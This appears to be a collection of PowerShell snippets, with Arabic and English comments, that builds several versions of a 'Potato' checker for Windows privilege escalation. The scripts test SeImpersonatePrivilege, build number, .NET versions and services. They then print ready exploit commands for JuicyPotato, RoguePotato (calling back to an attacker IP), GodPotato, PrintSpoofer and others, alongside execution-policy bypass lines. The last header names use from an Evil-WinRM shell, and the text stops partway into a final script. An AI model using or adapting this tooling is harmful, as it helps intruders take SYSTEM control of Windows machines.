

```
powershell -ep bypass
```


```
# احفظه كملف
$script = @'
Write-Host "=== Potato Checker ===" -ForegroundColor Cyan

$build   = [int](Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber
$priv    = C:\Windows\System32\whoami.exe /priv | Select-String "SeImpersonatePrivilege"
$hasPriv = $priv -match "Enabled"
$spooler = (Get-Service spooler -ErrorAction SilentlyContinue).Status
$winrm   = (Get-Service WinRM   -ErrorAction SilentlyContinue).Status
$bits    = (Get-Service BITS    -ErrorAction SilentlyContinue).Status

Write-Host "`nBuild Number    : $build"
Write-Host "SeImpersonate   : $hasPriv"
Write-Host "Spooler Status  : $spooler"
Write-Host "WinRM Status    : $winrm"
Write-Host "BITS Status     : $bits"
Write-Host "`n=== النتيجة ===" -ForegroundColor Yellow

if (-not $hasPriv) {
    Write-Host "[✗] SeImpersonatePrivilege مو مفعّل - ما تشتغل أي Potato" -ForegroundColor Red
    exit
}

if ($build -lt 14393) {
    Write-Host "[✓] Hot Potato - قابلة" -ForegroundColor Green
    Write-Host "    CMD: Potato.exe -ip <IP> -cmd <cmd> -disable_exhaust true -disable_defender true"
} else {
    Write-Host "[✗] Hot Potato - مباتشة (MS16-075)" -ForegroundColor DarkGray
}

if ($build -lt 17763) {
    Write-Host "[✓] Rotten Potato - قابلة" -ForegroundColor Green
    Write-Host "    CMD: MSFRottenPotato.exe t c:\windows\temp\test.bat"
} else {
    Write-Host "[✗] Rotten Potato - ما تشتغل على Build $build+" -ForegroundColor DarkGray
}

Write-Host "[✗] Lonely Potato - Deprecated، استخدم Juicy بدلها" -ForegroundColor DarkGray

if ($build -lt 17763) {
    Write-Host "[✓] Juicy Potato - قابلة" -ForegroundColor Green
    Write-Host "    CMD: juicypotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}"
} else {
    Write-Host "[✗] Juicy Potato - ما تشتغل على Build $build+" -ForegroundColor DarkGray
}

if ($build -ge 17763) {
    Write-Host "[✓] Rogue Potato - قابلة (Build $build)" -ForegroundColor Green
    Write-Host "    CMD: .\RoguePotato.exe -r <YOUR_IP> -e cmd.exe -l 9999"
} else {
    Write-Host "[✗] Rogue Potato - مو مناسبة لهذا البيلد" -ForegroundColor DarkGray
}

Write-Host "[✓] Sweet Potato - قابلة دايماً مع SeImpersonate" -ForegroundColor Green
Write-Host "    CMD: .\SweetPotato.exe -p cmd.exe -e PrintSpoofer"
Write-Host "    CMD: .\SweetPotato.exe -p cmd.exe -e DCOM"
Write-Host "    CMD: .\SweetPotato.exe -p cmd.exe -e EfsRpc"

if ($spooler -ne "Running" -and $winrm -eq "Running" -and $bits -ne "Running") {
    Write-Host "[✓] Generic Potato - قابلة" -ForegroundColor Green
    Write-Host "    CMD: .\GenericPotato.exe -e NamedPipe -p cmd.exe"
} elseif ($spooler -ne "Running" -and $winrm -ne "Running") {
    Write-Host "[~] Generic Potato - ممكن عبر HTTP إذا عندك SSRF" -ForegroundColor Yellow
    Write-Host "    CMD: .\GenericPotato.exe -e HTTP -p cmd.exe -l 8888"
} else {
    Write-Host "[✗] Generic Potato - الشروط ما اكتملت" -ForegroundColor DarkGray
}

Write-Host "`n=== التوصية النهائية ===" -ForegroundColor Cyan
Write-Host "[★] ابدأ بـ Sweet Potato دايماً - تغطي معظم الحالات" -ForegroundColor Green
'@

$script | Out-File -FilePath "C:\JavaTemp\PotatoChecker.ps1" -Encoding UTF8
```


```
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; C:\JavaTemp\PotatoChecker.ps1
```



الحل - شغّله مباشرة بدون ملف:

powershell

```powershell
& ([scriptblock]::Create((Get-Content "C:\JavaTemp\PotatoChecker.ps1" -Raw)))
```

أو لو ما اشتغل، شغّله inline بدون ما تحفظه:

powershell

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force; C:\Users\tony\Downloads\PotatoChecker.ps1
```

أو عن طريق المسار الكامل لـ powershell:

powershell

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\JavaTemp\PotatoChecker.ps1
```

جرب الأول `& ([scriptblock]::Create(...))` هو الأضمن في بيئتك 👌







```
# احفظه كملف PotatoChecker.ps1
$script = @'
Write-Host "=== Potato & Elevation Checker ===" -ForegroundColor Cyan

# 1. جمع معلومات النظام
$build    = [int](Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber
$priv     = whoami /priv | Select-String "SeImpersonatePrivilege"
$hasPriv  = $priv -match "Enabled"
$dotNet4  = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"
$spooler  = (Get-Service spooler -ErrorAction SilentlyContinue).Status
$winrm    = (Get-Service WinRM   -ErrorAction SilentlyContinue).Status

Write-Host "`nBuild Number    : $build"
Write-Host "SeImpersonate    : $(if($hasPriv){"YES"}else{"NO"})"
Write-Host ".NET 4.x Status : $(if($dotNet4){"Installed"}else{"Missing"})"
Write-Host "Spooler Status  : $spooler"
Write-Host "WinRM Status    : $winrm"

Write-Host "`n=== نتائج التحليل ===" -ForegroundColor Yellow

# شرط أساسي لكل عائلة الـ Potato
if (-not $hasPriv) {
    Write-Host "[✗] SeImpersonatePrivilege مو مفعّل - ما تشتغل أي Potato" -ForegroundColor Red
    exit
}

# --- GodPotato (الأحدث والأقوى حالياً) ---
if ($dotNet4) {
    Write-Host "[★] GodPotato - قابلة (موصى بها جداً)" -ForegroundColor Cyan
    Write-Host "    السبب: .NET 4.x موجود وتشتغل على Build $build"
    Write-Host "    CMD: .\GodPotato-NET4.exe -cmd ""whoami /all"""
} else {
    Write-Host "[✗] GodPotato - تحتاج تثبيت .NET 4.x" -ForegroundColor DarkGray
}

# --- Juicy Potato ---
if ($build -lt 17763) {
    Write-Host "[✓] Juicy Potato - قابلة" -ForegroundColor Green
    Write-Host "    CMD: juicypotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}"
} else {
    Write-Host "[✗] Juicy Potato - مباتشة (استخدم Rogue أو God بدلها)" -ForegroundColor DarkGray
}

# --- Rogue Potato ---
if ($build -ge 17763) {
    Write-Host "[✓] Rogue Potato - قابلة" -ForegroundColor Green
    Write-Host "    CMD: .\RoguePotato.exe -r <YOUR_IP> -e cmd.exe"
}

# --- PrintSpoofer (SweetPotato) ---
if ($spooler -eq "Running") {
    Write-Host "[✓] PrintSpoofer / SweetPotato - قابلة (Spooler شغال)" -ForegroundColor Green
    Write-Host "    CMD: .\PrintSpoofer.exe -i -c cmd"
} else {
    Write-Host "[✗] PrintSpoofer - خدمة Spooler معطلة" -ForegroundColor DarkGray
}

Write-Host "`n=== التوصية النهائية ===" -ForegroundColor Cyan
if ($dotNet4) {
    Write-Host "[➜] استخدم GodPotato: لأنها الأكثر استقراراً على الأنظمة الحديثة." -ForegroundColor White
} elseif ($spooler -eq "Running") {
    Write-Host "[➜] استخدم PrintSpoofer: لأن خدمة السبولر شغالة وهي الأسرع." -ForegroundColor White
} else {
    Write-Host "[➜] جرب SweetPotato (بوضع DCOM) أو RoguePotato." -ForegroundColor White
}
'@

$script | Out-File -FilePath "C:\Users\tony\Downloads\PotatoChecker.ps1" -Encoding UTF8
Write-Host "تم حفظ السكربت في Downloads باسم PotatoChecker.ps1" -ForegroundColor Green
```









**GodPotato**

```
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s
```









```
$script = @'
Write-Host "=== Ultimate Potato Selector ===" -ForegroundColor Cyan -BackgroundColor DarkBlue

# ===== جمع المعلومات =====
$build   = [int](Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber
$priv    = whoami /priv
$isSeImp = ($priv | Select-String "SeImpersonatePrivilege" | Select-String "Enabled") -ne $null

# فحص نسخ .NET
$net2  = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727"
$net35 = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5"
$net4  = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"

# فحص الخدمات
$spooler = (Get-Service spooler  -ErrorAction SilentlyContinue).Status
$ikeext  = (Get-Service IKEEXT   -ErrorAction SilentlyContinue).Status
$winrm   = (Get-Service WinRM    -ErrorAction SilentlyContinue).Status
$wuauserv= (Get-Service wuauserv -ErrorAction SilentlyContinue).Status

# ===== عرض المعلومات =====
Write-Host "`n[i] معلومات النظام:" -ForegroundColor Yellow
Write-Host "Build Number : $build"
Write-Host "SeImpersonate: $(if($isSeImp){'✓ Enabled'}else{'✗ Disabled'})" -ForegroundColor $(if($isSeImp){"Green"}else{"Red"})

Write-Host "`n[i] نسخ .NET المتاحة:" -ForegroundColor Yellow
Write-Host ".NET 2.0  : $(if($net2) {'✓ موجود'}else{'✗ غير موجود'})" -ForegroundColor $(if($net2) {"Green"}else{"Red"})
Write-Host ".NET 3.5  : $(if($net35){'✓ موجود'}else{'✗ غير موجود'})" -ForegroundColor $(if($net35){"Green"}else{"Red"})
Write-Host ".NET 4.x  : $(if($net4) {'✓ موجود'}else{'✗ غير موجود'})" -ForegroundColor $(if($net4) {"Green"}else{"Red"})

Write-Host "`n[i] حالة الخدمات:" -ForegroundColor Yellow
Write-Host "Print Spooler : $(if($spooler -eq 'Running'){'✓ شغال'}else{'✗ طافي'})" -ForegroundColor $(if($spooler -eq "Running"){"Green"}else{"Red"})
Write-Host "IKEEXT        : $(if($ikeext  -eq 'Running'){'✓ شغال'}else{'✗ طافي'})" -ForegroundColor $(if($ikeext  -eq "Running"){"Green"}else{"Red"})
Write-Host "WinRM         : $(if($winrm   -eq 'Running'){'✓ شغال'}else{'✗ طافي'})" -ForegroundColor $(if($winrm   -eq "Running"){"Green"}else{"Red"})
Write-Host "Windows Update: $(if($wuauserv-eq 'Running'){'✓ شغال'}else{'✗ طافي'})" -ForegroundColor $(if($wuauserv-eq "Running"){"Green"}else{"Red"})

# ===== تحليل كل أداة مع السبب =====
Write-Host "`n=== تحليل الأدوات مع الأسباب ===" -ForegroundColor Cyan

# GodPotato
Write-Host "`n[GodPotato]" -ForegroundColor White
if ($isSeImp -and $net4) {
    Write-Host "  ✓ مختارة - السبب: SeImpersonate مفعّلة + .NET 4.x موجود" -ForegroundColor Green
    Write-Host "  ← الأمر: .\GodPotato-NET4.exe -cmd `"cmd /c whoami /all`""
} elseif ($isSeImp -and $net35) {
    Write-Host "  ✓ مختارة (NET3.5) - السبب: لا يوجد NET4 لكن NET3.5 موجود" -ForegroundColor Yellow
    Write-Host "  ← الأمر: .\GodPotato-NET35.exe -cmd `"cmd /c whoami /all`""
} elseif ($isSeImp -and $net2) {
    Write-Host "  ✓ مختارة (NET2) - السبب: فقط NET2 متاح" -ForegroundColor Yellow
    Write-Host "  ← الأمر: .\GodPotato-NET2.exe -cmd `"cmd /c whoami /all`""
} elseif (-not $isSeImp) {
    Write-Host "  ✗ مرفوضة - السبب: SeImpersonate غير مفعّلة (شرط أساسي)" -ForegroundColor Red
} else {
    Write-Host "  ✗ مرفوضة - السبب: لا يوجد أي نسخة .NET مثبتة" -ForegroundColor Red
}

# PrintSpoofer
Write-Host "`n[PrintSpoofer]" -ForegroundColor White
if ($isSeImp -and $spooler -eq "Running") {
    Write-Host "  ✓ متاحة - السبب: SeImpersonate مفعّلة + Spooler يعمل" -ForegroundColor Green
    Write-Host "  ← الأمر: .\PrintSpoofer.exe -i -c cmd"
} elseif (-not $isSeImp) {
    Write-Host "  ✗ مرفوضة - السبب: SeImpersonate غير مفعّلة" -ForegroundColor Red
} else {
    Write-Host "  ✗ مرفوضة - السبب: خدمة Print Spooler طافية" -ForegroundColor Red
}

# JuicyPotatoNG
Write-Host "`n[JuicyPotatoNG]" -ForegroundColor White
if ($isSeImp -and $build -ge 17763) {
    Write-Host "  ✓ متاحة - السبب: Build $build مدعوم (>= 17763)" -ForegroundColor Green
    Write-Host "  ← الأمر: .\JuicyPotatoNG.exe -t * -p c:\windows\system32\cmd.exe"
} elseif (-not $isSeImp) {
    Write-Host "  ✗ مرفوضة - السبب: SeImpersonate غير مفعّلة" -ForegroundColor Red
} else {
    Write-Host "  ✗ مرفوضة - السبب: Build $build قديم جداً (< 17763)" -ForegroundColor Red
}

# EfsPotato
Write-Host "`n[EfsPotato]" -ForegroundColor White
if ($isSeImp) {
    Write-Host "  ✓ متاحة - السبب: بديل جيد عند فشل الباقي" -ForegroundColor Yellow
    Write-Host "  ← الأمر: .\EfsPotato.exe `"cmd.exe /c whoami`""
} else {
    Write-Host "  ✗ مرفوضة - السبب: SeImpersonate غير مفعّلة" -ForegroundColor Red
}

# ===== التوصية النهائية =====
Write-Host "`n=== التوصية النهائية ===" -ForegroundColor Cyan

if (-not $isSeImp) {
    Write-Host "✗ لا يمكن استخدام أي Potato! SeImpersonate غير متاحة." -ForegroundColor Red
    Write-Host "→ ابحث عن: AlwaysInstallElevated, Unquoted Service Path, Weak Service Permissions" -ForegroundColor Gray
} elseif ($net4) {
    Write-Host "★ الأفضل: GodPotato-NET4.exe" -ForegroundColor Green
    Write-Host "→ .\GodPotato-NET4.exe -cmd `"cmd /c whoami /all`"" -ForegroundColor White
} elseif ($net35) {
    Write-Host "★ الأفضل: GodPotato-NET35.exe" -ForegroundColor Green
} elseif ($net2) {
    Write-Host "★ الأفضل: GodPotato-NET2.exe" -ForegroundColor Yellow
} elseif ($spooler -eq "Running") {
    Write-Host "★ الأفضل: PrintSpoofer" -ForegroundColor Green
}
'@

$script | Out-File -FilePath ".\UltimatePotato.ps1" -Encoding UTF8
Write-Host "تم الحفظ! شغّل: .\UltimatePotato.ps1" -ForegroundColor Green
```








```
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
.\UltimatePotato.ps1
```




بالانقليزي
```
$script = @'
Write-Host "=== Ultimate Potato Selector ===" -ForegroundColor Cyan -BackgroundColor DarkBlue

# ===== Gather System Info =====
$build   = [int](Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber
$priv    = whoami /priv
$isSeImp = ($priv | Select-String "SeImpersonatePrivilege" | Select-String "Enabled") -ne $null

# Check .NET versions
$net2  = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727"
$net35 = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5"
$net4  = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"

# Check Services
$spooler  = (Get-Service spooler  -ErrorAction SilentlyContinue).Status
$ikeext   = (Get-Service IKEEXT   -ErrorAction SilentlyContinue).Status
$winrm    = (Get-Service WinRM    -ErrorAction SilentlyContinue).Status
$wuauserv = (Get-Service wuauserv -ErrorAction SilentlyContinue).Status

# ===== System Info =====
Write-Host "`n[i] System Information:" -ForegroundColor Yellow
Write-Host "Build Number  : $build"
Write-Host "SeImpersonate : $(if($isSeImp){'[+] Enabled'}else{'[-] Disabled'})" -ForegroundColor $(if($isSeImp){"Green"}else{"Red"})

Write-Host "`n[i] .NET Versions:" -ForegroundColor Yellow
Write-Host ".NET 2.0 : $(if($net2) {'[+] Found'}else{'[-] Not Found'})" -ForegroundColor $(if($net2) {"Green"}else{"Red"})
Write-Host ".NET 3.5 : $(if($net35){'[+] Found'}else{'[-] Not Found'})" -ForegroundColor $(if($net35){"Green"}else{"Red"})
Write-Host ".NET 4.x : $(if($net4) {'[+] Found'}else{'[-] Not Found'})" -ForegroundColor $(if($net4) {"Green"}else{"Red"})

Write-Host "`n[i] Services Status:" -ForegroundColor Yellow
Write-Host "Print Spooler  : $(if($spooler  -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($spooler  -eq "Running"){"Green"}else{"Red"})
Write-Host "IKEEXT         : $(if($ikeext   -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($ikeext   -eq "Running"){"Green"}else{"Red"})
Write-Host "WinRM          : $(if($winrm    -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($winrm    -eq "Running"){"Green"}else{"Red"})
Write-Host "Windows Update : $(if($wuauserv -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($wuauserv -eq "Running"){"Green"}else{"Red"})

# ===== Tool Analysis =====
Write-Host "`n=== Tool Analysis ===" -ForegroundColor Cyan

# GodPotato
Write-Host "`n[GodPotato]" -ForegroundColor White
if ($isSeImp -and $net4) {
    Write-Host "  [+] SELECTED - Reason: SeImpersonate Enabled + .NET 4.x Found" -ForegroundColor Green
    Write-Host "  CMD: .\GodPotato-NET4.exe -cmd `"cmd /c whoami /all`""
} elseif ($isSeImp -and $net35) {
    Write-Host "  [+] SELECTED (NET3.5) - Reason: No NET4 but NET3.5 available" -ForegroundColor Yellow
    Write-Host "  CMD: .\GodPotato-NET35.exe -cmd `"cmd /c whoami /all`""
} elseif ($isSeImp -and $net2) {
    Write-Host "  [+] SELECTED (NET2) - Reason: Only NET2 available" -ForegroundColor Yellow
    Write-Host "  CMD: .\GodPotato-NET2.exe -cmd `"cmd /c whoami /all`""
} elseif (-not $isSeImp) {
    Write-Host "  [-] REJECTED - Reason: SeImpersonate is NOT enabled (required)" -ForegroundColor Red
} else {
    Write-Host "  [-] REJECTED - Reason: No .NET version installed" -ForegroundColor Red
}

# PrintSpoofer
Write-Host "`n[PrintSpoofer]" -ForegroundColor White
if ($isSeImp -and $spooler -eq "Running") {
    Write-Host "  [+] AVAILABLE - Reason: SeImpersonate Enabled + Spooler Running" -ForegroundColor Green
    Write-Host "  CMD: .\PrintSpoofer.exe -i -c cmd"
} elseif (-not $isSeImp) {
    Write-Host "  [-] REJECTED - Reason: SeImpersonate is NOT enabled" -ForegroundColor Red
} else {
    Write-Host "  [-] REJECTED - Reason: Print Spooler service is Stopped" -ForegroundColor Red
}

# JuicyPotatoNG
Write-Host "`n[JuicyPotatoNG]" -ForegroundColor White
if ($isSeImp -and $build -ge 17763) {
    Write-Host "  [+] AVAILABLE - Reason: Build $build is supported (>= 17763)" -ForegroundColor Green
    Write-Host "  CMD: .\JuicyPotatoNG.exe -t * -p c:\windows\system32\cmd.exe"
} elseif (-not $isSeImp) {
    Write-Host "  [-] REJECTED - Reason: SeImpersonate is NOT enabled" -ForegroundColor Red
} else {
    Write-Host "  [-] REJECTED - Reason: Build $build too old (< 17763)" -ForegroundColor Red
}

# EfsPotato
Write-Host "`n[EfsPotato]" -ForegroundColor White
if ($isSeImp) {
    Write-Host "  [~] AVAILABLE - Reason: Good fallback if others fail" -ForegroundColor Yellow
    Write-Host "  CMD: .\EfsPotato.exe `"cmd.exe /c whoami`""
} else {
    Write-Host "  [-] REJECTED - Reason: SeImpersonate is NOT enabled" -ForegroundColor Red
}

# ===== Final Recommendation =====
Write-Host "`n=== Final Recommendation ===" -ForegroundColor Cyan

if (-not $isSeImp) {
    Write-Host "[-] Cannot use any Potato! SeImpersonate is not available." -ForegroundColor Red
    Write-Host "  Try: AlwaysInstallElevated, Unquoted Service Path, Weak Service Permissions" -ForegroundColor Gray
} elseif ($net4) {
    Write-Host "[★] Best Choice: GodPotato-NET4.exe" -ForegroundColor Green
    Write-Host "CMD: .\GodPotato-NET4.exe -cmd `"cmd /c whoami /all`"" -ForegroundColor White
} elseif ($net35) {
    Write-Host "[★] Best Choice: GodPotato-NET35.exe" -ForegroundColor Green
    Write-Host "CMD: .\GodPotato-NET35.exe -cmd `"cmd /c whoami /all`"" -ForegroundColor White
} elseif ($net2) {
    Write-Host "[★] Best Choice: GodPotato-NET2.exe" -ForegroundColor Yellow
    Write-Host "CMD: .\GodPotato-NET2.exe -cmd `"cmd /c whoami /all`"" -ForegroundColor White
} elseif ($spooler -eq "Running") {
    Write-Host "[★] Best Choice: PrintSpoofer" -ForegroundColor Green
    Write-Host "CMD: .\PrintSpoofer.exe -i -c cmd" -ForegroundColor White
}
'@

$script | Out-File -FilePath ".\UltimatePotato.ps1" -Encoding UTF8
Write-Host "Saved! Run: .\UltimatePotato.ps1" -ForegroundColor Green
```




```
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
.\UltimatePotato.ps1
```







```
$script = @'
Write-Host "=== Ultimate Potato Checker (All Tools) ===" -ForegroundColor Cyan -BackgroundColor DarkBlue

# ===== Gather Info =====
$build   = [int](Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").CurrentBuildNumber
$priv    = whoami /priv
$isSeImp = ($priv | Select-String "SeImpersonatePrivilege" | Select-String "Enabled") -ne $null

# .NET Versions
$net2  = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727"
$net35 = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5"
$net4  = Test-Path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"

# Services
$spooler  = (Get-Service spooler  -ErrorAction SilentlyContinue).Status
$ikeext   = (Get-Service IKEEXT   -ErrorAction SilentlyContinue).Status
$winrm    = (Get-Service WinRM    -ErrorAction SilentlyContinue).Status
$bits     = (Get-Service BITS     -ErrorAction SilentlyContinue).Status
$wuauserv = (Get-Service wuauserv -ErrorAction SilentlyContinue).Status

# ===== System Info =====
Write-Host "`n[i] System Information:" -ForegroundColor Yellow
Write-Host "Build Number  : $build"
Write-Host "SeImpersonate : $(if($isSeImp){'[+] Enabled'}else{'[-] Disabled'})" -ForegroundColor $(if($isSeImp){"Green"}else{"Red"})

Write-Host "`n[i] .NET Versions:" -ForegroundColor Yellow
Write-Host ".NET 2.0 : $(if($net2) {'[+] Found'}else{'[-] Not Found'})" -ForegroundColor $(if($net2) {"Green"}else{"Red"})
Write-Host ".NET 3.5 : $(if($net35){'[+] Found'}else{'[-] Not Found'})" -ForegroundColor $(if($net35){"Green"}else{"Red"})
Write-Host ".NET 4.x : $(if($net4) {'[+] Found'}else{'[-] Not Found'})" -ForegroundColor $(if($net4) {"Green"}else{"Red"})

Write-Host "`n[i] Services Status:" -ForegroundColor Yellow
Write-Host "Print Spooler  : $(if($spooler  -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($spooler  -eq "Running"){"Green"}else{"Red"})
Write-Host "IKEEXT         : $(if($ikeext   -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($ikeext   -eq "Running"){"Green"}else{"Red"})
Write-Host "WinRM          : $(if($winrm    -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($winrm    -eq "Running"){"Green"}else{"Red"})
Write-Host "BITS           : $(if($bits     -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($bits     -eq "Running"){"Green"}else{"Red"})
Write-Host "Windows Update : $(if($wuauserv -eq 'Running'){'[+] Running'}else{'[-] Stopped'})" -ForegroundColor $(if($wuauserv -eq "Running"){"Green"}else{"Red"})

# ===== Tool Analysis =====
Write-Host "`n=== Tool Analysis ===" -ForegroundColor Cyan

if (-not $isSeImp) {
    Write-Host "`n[-] SeImpersonatePrivilege NOT enabled - No Potato will work!" -ForegroundColor Red
    Write-Host "    Try: AlwaysInstallElevated, Unquoted Service Path, Weak Service Permissions" -ForegroundColor Gray
    exit
}

# Hot Potato
Write-Host "`n[Hot Potato]" -ForegroundColor White
if ($build -lt 14393) {
    Write-Host "  [+] WORKS - Reason: Build $build is < 14393 (before MS16-075 patch)" -ForegroundColor Green
    Write-Host "  CMD: .\Potato.exe -ip <IP> -cmd <cmd> -disable_exhaust true"
} else {
    Write-Host "  [-] REJECTED - Reason: Build $build is patched (MS16-075 fixed this)" -ForegroundColor Red
}

# Rotten Potato
Write-Host "`n[Rotten Potato]" -ForegroundColor White
if ($build -lt 17763) {
    Write-Host "  [+] WORKS - Reason: Build $build is < 17763" -ForegroundColor Green
    Write-Host "  CMD: .\MSFRottenPotato.exe t c:\windows\temp\test.bat"
} else {
    Write-Host "  [-] REJECTED - Reason: Build $build too new (patched after 17763)" -ForegroundColor Red
}

# Lonely Potato
Write-Host "`n[Lonely Potato]" -ForegroundColor White
Write-Host "  [-] REJECTED - Reason: Deprecated, use JuicyPotato instead" -ForegroundColor Red

# Juicy Potato (Old)
Write-Host "`n[Juicy Potato]" -ForegroundColor White
if ($build -lt 17763) {
    Write-Host "  [+] WORKS - Reason: Build $build is < 17763" -ForegroundColor Green
    Write-Host "  CMD: .\juicypotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}"
} else {
    Write-Host "  [-] REJECTED - Reason: Build $build is patched (use JuicyPotatoNG instead)" -ForegroundColor Red
}

# JuicyPotatoNG (New)
Write-Host "`n[JuicyPotatoNG]" -ForegroundColor White
if ($build -ge 17763) {
    Write-Host "  [+] WORKS - Reason: Build $build is supported (>= 17763)" -ForegroundColor Green
    Write-Host "  CMD: .\JuicyPotatoNG.exe -t * -p c:\windows\system32\cmd.exe"
} else {
    Write-Host "  [-] REJECTED - Reason: Build $build too old, use old JuicyPotato" -ForegroundColor Red
}

# Rogue Potato
Write-Host "`n[Rogue Potato]" -ForegroundColor White
if ($build -ge 17763) {
    Write-Host "  [+] WORKS - Reason: Build $build >= 17763" -ForegroundColor Green
    Write-Host "  CMD: .\RoguePotato.exe -r <YOUR_IP> -e cmd.exe -l 9999"
} else {
    Write-Host "  [-] REJECTED - Reason: Build $build not suitable" -ForegroundColor Red
}

# Sweet Potato
Write-Host "`n[Sweet Potato]" -ForegroundColor White
Write-Host "  [+] WORKS - Reason: Only needs SeImpersonate (always available)" -ForegroundColor Green
Write-Host "  CMD: .\SweetPotato.exe -p cmd.exe -e PrintSpoofer"
Write-Host "  CMD: .\SweetPotato.exe -p cmd.exe -e DCOM"
Write-Host "  CMD: .\SweetPotato.exe -p cmd.exe -e WinRM"

# PrintSpoofer
Write-Host "`n[PrintSpoofer]" -ForegroundColor White
if ($spooler -eq "Running") {
    Write-Host "  [+] WORKS - Reason: SeImpersonate Enabled + Spooler Running" -ForegroundColor Green
    Write-Host "  CMD: .\PrintSpoofer.exe -i -c cmd"
} else {
    Write-Host "  [-] REJECTED - Reason: Print Spooler is Stopped" -ForegroundColor Red
}

# Generic Potato
Write-Host "`n[Generic Potato]" -ForegroundColor White
if ($spooler -ne "Running" -and $winrm -eq "Running") {
    Write-Host "  [+] WORKS via NamedPipe - Reason: WinRM is Running" -ForegroundColor Green
    Write-Host "  CMD: .\GenericPotato.exe -e NamedPipe -p cmd.exe"
} elseif ($spooler -ne "Running" -and $winrm -ne "Running") {
    Write-Host "  [~] POSSIBLE via HTTP - Reason: Need SSRF to trigger" -ForegroundColor Yellow
    Write-Host "  CMD: .\GenericPotato.exe -e HTTP -p cmd.exe -l 8888"
} else {
    Write-Host "  [-] REJECTED - Reason: Conditions not met" -ForegroundColor Red
}

# EfsPotato
Write-Host "`n[EfsPotato]" -ForegroundColor White
Write-Host "  [~] AVAILABLE - Reason: Good fallback if others fail" -ForegroundColor Yellow
Write-Host "  CMD: .\EfsPotato.exe `"cmd.exe /c whoami`""

# God Potato
Write-Host "`n[GodPotato]" -ForegroundColor White
if ($build -ge 9200) {
    if ($net4) {
        Write-Host "  [+] WORKS - Reason: SeImpersonate Enabled + .NET 4.x + Build $build >= 9200" -ForegroundColor Green
        Write-Host "  CMD: .\GodPotato-NET4.exe -cmd `"cmd /c whoami /all`""
    } elseif ($net35) {
        Write-Host "  [+] WORKS (NET3.5) - Reason: SeImpersonate Enabled + .NET 3.5 available" -ForegroundColor Green
        Write-Host "  CMD: .\GodPotato-NET35.exe -cmd `"cmd /c whoami /all`""
    } elseif ($net2) {
        Write-Host "  [+] WORKS (NET2) - Reason: SeImpersonate Enabled + only .NET 2.0 available" -ForegroundColor Yellow
        Write-Host "  CMD: .\GodPotato-NET2.exe -cmd `"cmd /c whoami /all`""
    } else {
        Write-Host "  [-] REJECTED - Reason: No .NET version found" -ForegroundColor Red
    }
} else {
    Write-Host "  [-] REJECTED - Reason: Build $build too old (< 9200)" -ForegroundColor Red
}

# ===== Final Recommendation =====
Write-Host "`n=== Final Recommendation ===" -ForegroundColor Cyan

if ($build -ge 9200 -and $net4) {
    Write-Host "[1st] GodPotato-NET4  : .\GodPotato-NET4.exe -cmd `"cmd /c whoami /all`"" -ForegroundColor Green
} elseif ($build -ge 9200 -and $net35) {
    Write-Host "[1st] GodPotato-NET35 : .\GodPotato-NET35.exe -cmd `"cmd /c whoami /all`"" -ForegroundColor Green
}

Write-Host "[2nd] Sweet Potato    : .\SweetPotato.exe -p cmd.exe -e DCOM" -ForegroundColor Yellow

if ($spooler -eq "Running") {
    Write-Host "[3rd] PrintSpoofer    : .\PrintSpoofer.exe -i -c cmd" -ForegroundColor Yellow
} elseif ($build -ge 17763) {
    Write-Host "[3rd] JuicyPotatoNG   : .\JuicyPotatoNG.exe -t * -p c:\windows\system32\cmd.exe" -ForegroundColor Yellow
}

Write-Host "[Last] EfsPotato      : .\EfsPotato.exe `"cmd.exe /c whoami`"" -ForegroundColor Gray
'@

$script | Out-File -FilePath ".\UltimatePotato_Final.ps1" -Encoding UTF8
Write-Host "Saved! Run: .\UltimatePotato_Final.ps1" -ForegroundColor Green
```





```
.\UltimatePotato_Final.ps1
```





```
# الصق السكريبت كامل ثم شغّل:
.\UltimatePotato_Improved.ps1
```


```
$script = @'
# ============================================================
#   Ultimate Potato Checker - Improved Version
#   Purpose : Detect viable Potato privilege escalation paths
#   Usage   : Run from memory or disk in Evil-WinRM / PS shell
# ============================================================

